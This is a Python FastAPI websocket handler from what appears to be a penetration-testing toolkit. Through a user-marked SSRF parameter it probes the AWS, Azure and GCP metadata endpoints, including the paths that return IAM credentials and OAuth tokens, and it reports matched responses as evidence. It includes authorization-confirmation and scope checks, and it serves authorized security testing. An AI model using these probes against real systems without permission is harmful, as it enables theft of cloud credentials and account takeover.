"""IMDS Tester — focused cloud-metadata diagnostic.

The user supplies a URL with a `FUZZ` marker (the SSRF sink to probe through),
and we test every known IMDS endpoint for AWS / Azure / GCP through it. The
response is grouped by cloud and per-endpoint so it's easy to read at a glance.

This is a more opinionated variant of the SSRF page — same payloads, but with
cloud-specific result rendering instead of a generic payload list.

WS  /ws/imds
    client -> server:
        {"url":"...FUZZ...", "method":"GET","body":"","headers":{},
         "cookies":{}, "clouds":["aws","azure","gcp"],
         "allow_private":false, "confirm_auth":true}

    server -> client:
        {"type":"started",   "clouds":[...],"total":<int>}
        {"type":"probe",     "cloud","path","status","hit","elapsed_ms","evidence"?}
        {"type":"done",      "elapsed","clouds_hit":[...],"stopped"}
        {"type":"error",     "detail"}
"""
from __future__ import annotations

import asyncio
import logging
import time

from fastapi import APIRouter, WebSocket, WebSocketDisconnect

from lib import scope, web_fuzz
from lib.errors import ErrorCode, MhpError, ws_error
from lib.mode import get_mode
from lib.validators import validate_url
from urllib.parse import urlparse

logger = logging.getLogger(__name__)

router = APIRouter(tags=["imds"])

# Per-cloud probe definitions: (path, extra_headers, success_signatures)
PROBES: dict[str, list[tuple[str, dict[str, str], list[str]]]] = {
    "aws": [
        ("http://169.254.169.254/latest/meta-data/",                 {}, ["ami-id", "instance-id", "iam/"]),
        ("http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                                                                     {}, ["AccessKeyId", "SecretAccessKey", "Token"]),
        ("http://169.254.169.254/latest/dynamic/instance-identity/document",
                                                                     {}, ["accountId", "region", "instanceId"]),
        ("http://169.254.169.254/latest/user-data",                  {}, ["#!/", "#cloud-config"]),
        ("http://169.254.169.254/latest/api/token",                  {"X-aws-ec2-metadata-token-ttl-seconds": "21600"}, ["AQAE"]),
    ],
    "azure": [
        ("http://169.254.169.254/metadata/instance?api-version=2021-02-01",
                                                                     {"Metadata": "true"}, ["compute", "vmId", "subscriptionId"]),
        ("http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
                                                                     {"Metadata": "true"}, ["access_token", "Bearer", "expires_in"]),
    ],
    "gcp": [
        ("http://metadata.google.internal/computeMetadata/v1/",
                                                                     {"Metadata-Flavor": "Google"}, ["instance/", "project/"]),
        ("http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
                                                                     {"Metadata-Flavor": "Google"}, ["access_token", "Bearer"]),
        ("http://metadata.google.internal/computeMetadata/v1/project/project-id",
                                                                     {"Metadata-Flavor": "Google"}, [""]),
    ],
}


@router.websocket("/ws/imds")
async def imds_ws(ws: WebSocket) -> None:
    await ws.accept()
    stop = asyncio.Event()

    async def listen_for_stop() -> None:
        try:
            while True:
                msg = await ws.receive_json()
                if isinstance(msg, dict) and msg.get("action") == "stop":
                    stop.set(); return
        except Exception:
            stop.set()

    try:
        init = await ws.receive_json()
        url = str(init.get("url", "")).strip()
        engagement_id = init.get("engagement_id") or None
        if not url:
            await ws.send_json(ws_error(ErrorCode.INVALID_URL, "url is required"))
            await ws.close(); return

        try:
            url = validate_url(url)
        except MhpError as exc:
            await ws.send_json(ws_error(exc.code, exc.message))
            await ws.close(); return

        tmpl = web_fuzz.FuzzTemplate(
            url=url,
            method=str(init.get("method", "GET")).upper(),
            body=str(init.get("body", "")),
            headers=dict(init.get("headers") or {}),
            cookies=dict(init.get("cookies") or {}),
        )
        if not tmpl.has_marker():
            await ws.send_json(ws_error(
                ErrorCode.BAD_REQUEST,
                f"Place '{web_fuzz.DEFAULT_MARKER}' where the SSRF URL parameter goes",
            ))
            await ws.close(); return
        if not bool(init.get("confirm_auth", False)):
            await ws.send_json(ws_error(
                ErrorCode.NEED_CONFIRM,
                "Confirm you have authorization to test this target",
            ))
            await ws.close(); return

        confirm = bool(init.get("confirm", False))
        init_mode = str(init.get("mode", "")).strip().lower()
        mode = "engagement" if init_mode == "engagement" else (
            "lab" if init_mode == "lab" else get_mode(ws)
        )
        host_for_scope = urlparse(url).hostname or url
        if not await scope.enforce_ws(ws, host_for_scope, engagement_id, mode, confirm=confirm):
            return

        allow_private = bool(init.get("allow_private", False))
        ok, reason = web_fuzz.check_scope(url, allow_private)
        if not ok:
            await ws.send_json(ws_error(ErrorCode.TARGET_DENIED, reason))
            await ws.close(); return

        clouds = list(init.get("clouds") or ["aws", "azure", "gcp"])
        clouds = [c for c in clouds if c in PROBES]
        total = sum(len(PROBES[c]) for c in clouds)
        await ws.send_json({"type": "started", "clouds": clouds, "total": total})

        listener = asyncio.create_task(listen_for_stop())
        t0 = time.monotonic()
        clouds_hit: set[str] = set()

        for cloud in clouds:
            if stop.is_set():
                break
            for path, extra_hdrs, sigs in PROBES[cloud]:
                if stop.is_set():
                    break
                local_tmpl = web_fuzz.FuzzTemplate(
                    url=tmpl.url, method=tmpl.method, body=tmpl.body,
                    headers={**tmpl.headers, **extra_hdrs},
                    cookies=tmpl.cookies,
                )
                r = await web_fuzz.baseline(local_tmpl, sentinel=path, timeout=15.0)
                hit = web_fuzz.contains_any(r.body, [s for s in sigs if s])
                if hit:
                    clouds_hit.add(cloud)
                await ws.send_json({
                    "type": "probe", "cloud": cloud, "path": path,
                    "status": r.status, "elapsed_ms": r.elapsed_ms,
                    "hit": hit, "evidence": r.body[:1500] if hit else "",
                })
                await asyncio.sleep(0.15)  # gentle, sequential per cloud

        listener.cancel()
        await ws.send_json({
            "type": "done",
            "elapsed": round(time.monotonic() - t0, 2),
            "clouds_hit": sorted(clouds_hit),
            "stopped": stop.is_set(),
        })
    except WebSocketDisconnect:
        stop.set()
    except Exception as exc:
        logger.exception("imds ws failed")
        try:
            await ws.send_json(ws_error(
                ErrorCode.INTERNAL,
                f"IMDS probe failed ({type(exc).__name__})",
            ))
        except Exception:
            pass
    finally:
        try:
            await ws.close()
        except Exception:
            pass
